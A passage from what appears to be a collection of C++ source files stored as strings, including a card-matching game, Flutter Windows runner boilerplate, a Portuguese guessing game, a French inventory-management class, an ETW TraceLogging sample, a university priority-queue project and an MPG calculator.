1;\n\n  while(cpt_alice < cpt_end_alice || cpt_bob < cpt_end_bob){  // iterate until all card have been seen\n\n    // Alice turn\n    bool bob_has_card   = false;\n    bool already_found  = true;\n\n    while((!(bob_has_card) || already_found) && cpt_alice < cpt_end_alice){\n      Card alice_card = alice.cardInPosition(cpt_alice);      // choose the i card in order of Alice BST\n      bob_has_card    = bob.contains(alice_card);             // search if Bob has the card\n      already_found   = matching_card.contains(alice_card);\n\n      if (bob_has_card && !already_found){                    // if Bob has the card print message \n        cout << \"Alice picked matching card \"; \n        alice_card.print();\n        cout << endl;\n        matching_card.insert(alice_card);\n      } else if (!already_found) {                            // else add the card to Alice final BST\n        alice_final.insert(alice_card);\n      }\n      cpt_alice++;\n    }\n\n    // Bob turn\n    bool alice_has_card = false;\n    already_found  = true;\n\n    while((!alice_has_card || already_found) && cpt_bob < cpt_end_bob){\n      Card bob_card   = bob.cardInPositionReverse(cpt_bob);   // choose the i card in reverse order of Bob BST\n      alice_has_card  = alice.contains(bob_card);             // search if Alice has the card\n      already_found   = matching_card.contains(bob_card);\n\n      if (alice_has_card && !already_found){                  // if Alice has the card print message \n        cout << \"Bob picked matching card \";\n        bob_card.print();\n        cout << endl;\n        matching_card.insert(bob_card);\n      } else if (!already_found){                             // else add the card to Bob final BST\n        bob_final.insert(bob_card);\n      }\n      cpt_bob++;\n    }\n  }\n  // end of the game\n  \n  // print Alice final card at the end\n  cout << endl << \"Alice's cards:\" << endl;\n  const int cpt_alice_final = alice_final.count() + 1;\n\n  for (int i = 1 ; i < cpt_alice_final; i++){\n    Card alice_card = alice_final.cardInPosition(i);\n    alice_card.print();\n    cout << endl;\n  }\n  \n  // print Bob final card at the end\n  cout << endl << \"Bob's cards:\";\n  const int cpt_bob_final = bob_final.count() + 1;\n\n  for (int i = 1 ; i < cpt_bob_final ; i++){\n    Card bob_card = bob_final.cardInPosition(i);\n    cout << endl;\n    bob_card.print();\n  }\n\n  return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"getx_todo_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n  Um algoritmo que tem como objetivo ser um jogo com 3 niveis de dificuldade, \nsendo elas: [facil, medio, dificil].\n  O jogo ter\u00e1 um numero sorteado e o objetivo do jogador \u00e9 descobrir o numero sorteado pelo metodo de tentativa e erro.\n*/\n#include <iostream> //Biblioteca principal de entrada e saida padr\u00e3o.\n#include <cstdlib> // Bibliotecas padr\u00e3o do c.\n#include <ctime> // Biblioteca time do c.\n\nusing namespace std; // using std para agilizar o proscesso de codar os 'cout' e 'cin'.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos); // Mostrando minha fun\u00e7\u00e3o para o codigo.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos){ // Declarando fun\u00e7\u00e3o.\n  short numChute = 0; // Dando um valor inicial para numChute.\n  short numD2 = -1; // Valor inicial para numD2.\n\n  if(dificuldade == 2){ // Se escolha da dificuldade seja media, fa\u00e7a numD2 == 16 e iniciar com 200 pontos.\n    numD2 = 16;\n    *pontos = 200;\n  }else if(dificuldade == 3){ // Se dificuldade for igual a dificil numD2 == 6 e iniciar com 300 pontos.\n    numD2 = 6;\n    *pontos = 300;\n  }\n\n  do{\n\n    cout << \"\\n\\tTentativas \" << *tentativas << \" chute um numero: \"; // Mostra o numero da tentativa indo de 0 a infinito dependendo da dificuldade escolhida.\n\n    cin >> numChute; // l\u00ea o valor chutado.\n\n    if(numChute < numSorte)cout << \"\\t\\033[1;91mSeu numero \u00e9 menor que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for menor que numro sorteado vai escrever em vermelho uma mensagem sobre.\n    else if(numChute > numSorte) cout << \"\\t\\033[1;33mSeu numero \u00e9 maior que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for maior que numro sorteado vai escrever em amarelo uma mensagem sobre.\n\n    if(*tentativas > 0 || numChute == numSorte){ // Condi\u00e7\u00e3o para pular a primeira execu\u00e7\u00e3o e caso acerte.\n      if(dificuldade == 1) *pontos = *pontos - 2; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 2) *pontos = *pontos - 12; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 3) *pontos = *pontos - 43; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n    }\n\n    *tentativas = *tentativas + 1; // Acrescenta 1 a tentativas.\n  }while(numChute != numSorte && *tentativas != numD2); // Vai continuar perguntando o valor sorteado at\u00e9 que acerte ou acabe o numero definido de tentativas(O numero de tentativas ser\u00e1 definido de acordo com o nivel de dificuldade escolhida pelo jogador.).\n\n  return (numChute == numSorte); // Retorna um valor boleano sendo 1 : 0\n}\n\nint main(){\n  \n  srand(time(NULL));\n  const short numSorte = rand() % 101; // O numero sorteado\n\n  short dificuldade = 0; // Valor inicial para dificuldade\n  int tentativas = 0; // valor inicial para o numero de tentativas\n  short pontos = 100; // valor inicial de pontos, para caso seja escolhida a dificuldade 1.\n\n  cout << \"\\t********************\\n\";\n  cout << \"\\t*----Hello Word----*\\n\";\n  cout << \"\\t********************\\n\";\n\n  cout << \"\\n\\tEscolha sua dificuldade \\n \\x1b[1;96mfacil: 1\\n \\x1b[1;90mmedio: 2\\n \\x1b[1;95mdificil: 3\\n\\t\\x1b[0mdificuldade: \";\n  cin >> dificuldade; // Escolhe a dificuldade.\n\n  if(chutes(numSorte, dificuldade, &tentativas, &pontos)) cout << \"\\n\\t\\x1b[1;33mVoc\u00ea ganhou, parab\u00e9ns\\n\"; // Aqui vai executar a fun\u00e7\u00e3o chutes e quado finalizar vai retornar um valor boleano, sendo que se for verdadeiro, aparecer\u00e1 a mensagem para o jogador que ele ganhou.\n  else{\n    cout << \"\\n\\t\\033[91mVoc\u00ea perdeu. O numero era \" << numSorte << \" quem sabe na proxima.\\n\"; // Caso contrario mostrar\u00e1 a mensagem que perdeu.\n    pontos = 0; // E vai perder a pontua\u00e7\u00e3o.\n  }\n\n  cout << \"\\n\\tVoc\u00ea tentou \" << tentativas << \" vezes\\n\\n\\t\" << pontos << \" Pontos\\n\\n\"; // Mostra o numero de vezes que chutou at\u00e9 acertar ou at\u00e9 perder, e mostra sua pontua\u00e7\u00e3o final.\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <stdexcept>\r\n\r\nusing namespace std;\r\n// class Utilisateur  (user)\r\nclass User {\r\nprivate:\r\n    static int idU;\r\n    int userID;\r\n    string nom, prenom;\r\n    string username;\r\n    string password;\r\n    string departement;\r\npublic:\r\n/* Constructors */\r\n    User(){ userID = idU++; }\r\n    User(string n, string pre, string u, string p, string d):userID(idU++), nom(n), prenom(pre), username(u), password(p), departement(d){}\r\n    // getters\r\n    int getId()const { return userID; }\r\n    string getNom()const { return nom;}\r\n    string getPrenom()const{return prenom ;}\r\n    string getUsername()const { return username;}\r\n    string getDepartement()const {return  departement ;}\r\n    // setters \r\n    void setNom(string nom) { this->nom = nom;}\r\n    void setPrenom(string prenom) {this->prenom = prenom;}\r\n    void setUsername(string username) {this->username = username;}\r\n    void setPassword(string password) {this->password = password;}\r\n    void setDepartement(string departement) {this->departement = departement;}\r\n\r\n\r\n\r\n    bool authenticate(string u, string p) const {\r\n        return username == u && password == p;\r\n    }\r\n    friend ostream& operator<<(ostream& on, const User& u) {\r\n        on << \"-------------------------------\" << endl;\r\n        on << \"ID de l'utilisateur: \" << u.userID << endl;\r\n        on << \"Nom: \" << u.nom << endl;\r\n        on << \"Prenom: \" << u.prenom << endl;\r\n        on << \"Username: \" << u.username << endl;\r\n        on << \"Departement: \" << u.departement << endl;\r\n        return on;\r\n    }\r\n    friend istream& operator>>(istream& in, User& u){\r\n        cout << \"entrer le  nom de l'utilisateur\"<< endl;\r\n        in >> u.nom;\r\n        cout << \"entrer le prenom de l'utilisateur\"<<endl;\r\n        in >> u.prenom;\r\n        cout << \"entrer le Username de l'utilisateur\"<<endl;\r\n        in >> u.username;\r\n        cout << \"entrer le password de  l'utilisateur\"<<endl;\r\n        in >> u.password;\r\n        cout << \"entrer la departement de  l'utilisateur\"<<endl;\r\n        in >> u.departement;\r\n        return in;\r\n    }\r\n    void aff(){ cout<<\"\\n\\t[ID= \"<<userID<<\"][\"<<nom<<\":\"<<prenom<<\"]\"; }\r\n    ~User() {}\r\n};\r\nint User::idU = 1;\r\n\r\n// class matariel\r\nclass Material {\r\nprivate:\r\n    static  int idM;\r\n    int mId;\r\n    string nom,typeMat,reference,emplacement;\r\n    bool statue;\r\n    vector<User> usersAcce;\r\npublic:\r\n    Material(string n, string t, string r, string e,bool s): mId(idM++), nom(n), typeMat(t), reference(r), emplacement(e),statue(s){}\r\n    // getters est setters\r\n    int getId() const {return mId;}\r\n    const string& getNom() const {return nom;}\r\n    void setNom(const string& name) {nom = name;}\r\n    const string& getType() const {return typeMat;}\r\n    void setType(const string& type) {typeMat = type;}\r\n    const string& getReference() const {return reference;}\r\n    void setReference(const string& ref) {reference = ref;}\r\n    const string& getEmplacement() const {return emplacement;}\r\n    void setEmplacement(const string& place) {emplacement = place;}\r\n    bool isStatue() const {return statue;}\r\n    void setStatue(bool status) {statue = status;}\r\n\r\n    void usersAcceAff(){\r\n        if(!usersAcce.empty()){\r\n            for (auto u:usersAcce) {\r\n                u.aff();\r\n            }\r\n        } else{ cout<<\"*Aucun utilisateur*\";}\r\n    }\r\n    friend ostream& operator<<(ostream& on, const Material& m) {\r\n        on <<\"\\n\\n---------------------------\\n\";\r\n        on << \"ID de matariel: \" << m.mId << endl;\r\n        on << \"Nom: \" << m.nom << endl;\r\n        on << \"type: \" << m.typeMat << endl;\r\n        on << \"reference: \" << m.reference << endl;\r\n        on << \"emplacement: \" << m.emplacement << endl;\r\n        on << \"statut: \";m.statue?cout<<\" en service \"<<endl:cout<<\" Hors service \"<<endl;\r\n        return on;\r\n    }\r\n    friend istream& operator>>(istream& in, Material& m) {\r\n        cout <<\"\\n---------------------------\\n\";\r\n        cout << \"Entrer le nom du materiel : \";\r\n        in >> m.nom;\r\n        cout << \"Entrer le type du materiel : \";\r\n        in >> m.typeMat;\r\n        cout << \"Entrer la reference du materiel : \";\r\n        in >> m.reference;\r\n        cout << \"Entrer l'emplacement du materiel : \";\r\n        in >> m.emplacement;\r\n        cout << \"Le materiel est-il en service ? (1 pour oui, 0 pour non) : \";\r\n        in >> m.statue;\r\n        return in;\r\n    }\r\n    void aff(){\r\n        cout<<\"\\n\\t\\t[-\"<<mId<<\"-]-_-( \"<<nom<<\" )-_-( \"<<typeMat<<\" )\";\r\n    }\r\n    void affX(){\r\n        cout<<\"\\n\\t__________Matarial__________\";\r\n        cout << \"ID de matariel: \" << mId << endl;\r\n        cout << \"Nom: \" << nom << endl;\r\n        cout << \"type: \" << typeMat << endl;\r\n        cout << \"reference: \" << reference << endl;\r\n        cout << \"emplacement: \" << emplacement << endl;\r\n        cout << \"statut: \";statue?cout<<\" en service \"<<endl:cout<<\" Hors service \"<<endl;\r\n    }\r\n    void adduser(User u){\r\n        user",
    "#include <bitset>\n#include <conio.h>\n#include <iostream>\n#include <chrono>\n#include <thread>\n\n#include <windows.h> // Definitions required by TraceLoggingProvider.h\n#include <TraceLoggingProvider.h> // The C/C++ TraceLogging API\n\nusing namespace std;\n\nvoid EmitCaptureStateEvents(ULONGLONG match_any_keyword, ULONGLONG match_all_keyword);\n\n// Define a handle to a TraceLogging provider\nTRACELOGGING_DEFINE_PROVIDER(\n  g_hMyComponentProvider,\n  \"EtwCallbackSample\",\n  // {0205c222-cf97-5c11-9756-56a2cee02cb0}\n  (0x0205c222, 0xcf97, 0x5c11, 0x97, 0x56, 0x56, 0xa2, 0xce, 0xe0, 0x2c, 0xb0));\n\n// This callback is invoked by Windows every time the ETW tracing status is changed for this application.\nvoid WINAPI ETWEnableCallback(LPCGUID /* source_id */, ULONG is_enabled,\n  UCHAR level, ULONGLONG match_any_keyword,\n  ULONGLONG match_all_keyword,\n  PEVENT_FILTER_DESCRIPTOR filter_data,\n  PVOID /* callback_context */)\n{\n  cout\n    << \"is_enabled:\" << (void*)is_enabled\n    << \"; level:\" << (void*)level\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << \"; filter_data:\" << (void*)filter_data\n    << endl\n  ;\n\n  if (is_enabled == 2)\n  {\n    auto t = thread(EmitCaptureStateEvents, match_any_keyword, match_all_keyword);\n    t.join();\n  }\n}\n\nvoid LoopUntilQ()\n{\n  cout << \"Type 'q' when you want to quit.\" << endl;\n\n  char c;\n  \n  while (true) {\n    c = _getch();\n    if (c == 'q') {\n      break;\n    }\n  }\n}\n\nint main()\n{\n  cout << \"Calling TraceLoggingRegisterEx.\" << endl;\n  TraceLoggingRegisterEx(g_hMyComponentProvider, ETWEnableCallback, nullptr);\n  cout << \"TraceLoggingRegisterEx returned.\" << endl << endl;\n\n  LoopUntilQ();\n\n  cout << endl << \"Calling TraceLoggingUnregister.\" << endl;\n  TraceLoggingUnregister(g_hMyComponentProvider);\n  cout << \"TraceLoggingUnregister returned.\" << endl;\n}\n\n\nvoid EmitCaptureStateEvents(ULONGLONG match_any_keyword, ULONGLONG match_all_keyword)\n{\n  cout\n    << \"Emitting capture state events for \"\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << endl\n  ;\n\n  this_thread::sleep_for(chrono::milliseconds(10000));\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider, \n    \"capturestate-event1\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x1)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event2\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x2)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event4\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x4)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event8\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x8)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event10\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x10)\n  );\n\n  TraceLoggingWrite(\n    g_hMyComponentProvider,\n    \"capturestate-event20\",\n    TraceLoggingLevel(1),\n    TraceLoggingKeyword(0x20)\n  );\n\n  cout\n    << \"Done emitting capture state events for \"\n    << \"; match_any_keyword:\" << (void*)match_any_keyword\n    << \"; match_all_keyword:\" << (void*)match_all_keyword\n    << endl\n  ;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"calculatoriya\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/ UMBC - CMSC 341 - Spring 2024 - Proj3                                                                                                                                     \n#include \"rqueue.h\"\n\n//Name: RQueue (Constructor)                                                                                                                                                 \n//Desc: Creates empty queue and initializes values                                                                                                                           \n//Preconditions: required variables provided                                                                                                                                 \n//Postconditions: Empty queue is created with intialized values                                                                                                              \nRQueue::RQueue(prifn_t priFn, HEAPTYPE heapType, STRUCTURE structure) {\n  m_heap = nullptr;\n  m_size = 0;\n  m_priorFunc = priFn;\n  m_heapType = heapType;\n  m_structure = structure;\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all memory and re-initializaed the member variables                                                                                                      \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All memory is deallocated and member variables reinitialized                                                                                               \nRQueue::~RQueue() {\n  clear();\n}\n\n\n\n//Name: Destructor                                                                                                                                                           \n//Desc: Deallocates all nodes and re-initializaed the member variables                                                                                                       \n//Preconditions: Heap exists                                                                                                                                                 \n//Postconditions: All nodes are deallocated and member variables reinitialized                                                                                               \n//leaving an empty heap                                                                                                                                                      \nvoid RQueue::clear() {\n  clear(m_heap);\n  m_size = 0;\n}\n\n\n\n//Name: RQueue (Copy Constructor)                                                                                                                                            \n//Desc: creates a deep copy of rhs object                                                                                                                                    \n//Preconditions: Heap exist                                                                                                                                                  \n//Postconditions: a deep copy of heap is created                                                                                                                             \nRQueue::RQueue(const RQueue& rhs) {\n  //copies mem variables                                                                                                                                                     \n  m_size = rhs.m_size;\n  m_priorFunc = rhs.m_priorFunc;\n  m_heapType = rhs.m_heapType;\n  m_structure = rhs.m_structure;\n\n  //if root exists                                                                                                                                                           \n  if(rhs.m_heap != nullptr){\n    //recursive copy                                                                                                                                                         \n    copy(m_heap, rhs.m_heap);\n\n    //in case empty heap                                                                                                                                                     \n  }else{\n    m_heap = nullptr;\n  }\n}\n\n//Name: getHeapType                                                                                                                                                          \n//Desc: returns heap type                                                                                                                                                    \n//Preconditions: tree exists with defined heap type                                                                                                                          \n//Postconditions: heap type is returned                                                       ",
    "#include \"Options.h\"\n#include \"../Menu.h\"\n#include \"../../input/Input.h\"\n\nOptions::Options(int* value) {\n\tm_Value = value;\n\tm_CanBeSelected = true;\n\n\tm_Label = \"Options\";\n\n\tm_OnUpdate = std::bind(&Options::Update, this);\n\tm_OnDraw = std::bind(&Options::Draw, this, std::placeholders::_1, std::placeholders::_2);\n}\n\nvoid Options::Update() {\n\tif (!m_IsSelected) return;\n\n\tif (Input::GetKeyDown(VK_LEFT)) {\n\t\tChangeOption(-1);\n\t}\n\n\tif (Input::GetKeyDown(VK_RIGHT)) {\n\t\tChangeOption(1);\n\t}\n}\n\nvoid Options::Draw(float x, float y) {\n\tfloat displayW = 150.0f;\n\tfloat displayH = 20.0f;\n\tDrawNumberDisplay(x + m_Size.x - (displayW)-10, y + m_Size.y / 2 - (displayH) / 2, displayW, displayH);\n}\n\nvoid Options::DrawNumberDisplay(float x, float y, float width, float height)\n{\n\tstd::string text = \"?\";\n\n\tint optionIndex = GetOptionIndexByValue(*m_Value);\n\tif(optionIndex != -1) text = m_Options[optionIndex].text;\n\n\tfloat margin = 2.0f;\n\n\tMenu::DrawRect(x - margin, y - margin, width + margin * 2, height + margin * 2, CRGBA(255, 255, 255, 180));\n\n\tMenu::m_FontAlign = eFontAlignment::ALIGN_CENTER;\n\tMenu::DrawString(text, x + width / 2, y + height / 2 - 10.0f, CRGBA(0, 0, 0));\n\tMenu::m_FontAlign = eFontAlignment::ALIGN_LEFT;\n\n\tMenu::DrawArrowButton(x, y, eArrowDirection::LEFT, height, height, optionIndex != 0);\n\tMenu::DrawArrowButton(x + width - height, y, eArrowDirection::RIGHT, height, height, optionIndex < (int)m_Options.size() - 1);\n}\n\nvoid Options::AddOption(std::string text, int value) {\n\tOption option = { text, value };\n\tm_Options.push_back(option);\n}\n\nint Options::GetOptionIndexByValue(int value) {\n\tint i = 0;\n\tfor (Option option : m_Options) {\n\t\tif (option.value == value) return i;\n\t\ti++;\n\t}\n\treturn -1;\n}\n\nvoid Options::ChangeOption(int by) {\n\tint next = GetOptionIndexByValue(*m_Value) + by;\n\n\tif (next >= 0 && next < (int)m_Options.size()) {\n\t\t*m_Value = m_Options[next].value;\n\t}\n\n\tif (m_OnChange) m_OnChange();\n}",
    "#include <iostream>\n#include <iomanip>\n#include <string>\n#include <limits>\n#include <cctype>\nusing namespace std;\n\ndouble calcMPG(double gallons, double miles);\n\nint main()\n{\n\tconst double MAX_GALS = 100;\n\tconst double MILES = 500;\n\tbool valid = true;\n\tdouble gallons = 0.0;\n\tdouble mpg = 0.0;\n\tstring carMake;\n\n\n\tcout << \"Enter the make of the car: \";\n\tgetline(cin, carMake);\n\n\tdo\n\t{\n\t\tcout << \"\\nEnter how many gallons of fuel were used: \";\n\t\tcin >> gallons;\n\n\t\tif (cin.fail() || gallons <= 0) // Check for invalid input in the form of characters or 0 or negative numbers\n\t\t{\n\t\t\tif (cin.fail())\n\t\t\t{\n\t\t\t\tcout << \"\\nPlease enter numbers and not characters.\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"\\nInvalid input. Please enter a positive number.\\n\";\n\t\t\t}\n\t\t\tcin.clear(); // clear error flag\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n'); // ignore input in buffer until newline character\n\t\t\tvalid = false; // set flag to false to ensure do while loops again\n\t\t}\n\t\telse if (gallons > MAX_GALS)\n\t\t{\n\t\t\tcout << \"\\nThat seems like a very high amount. Are you sure? (y/n): \";\n\t\t\tchar confirm;\n\t\t\tcin >> confirm;\n\n\t\t\tif (tolower(confirm) == 'y')\n\t\t\t{\n\t\t\t\tvalid = 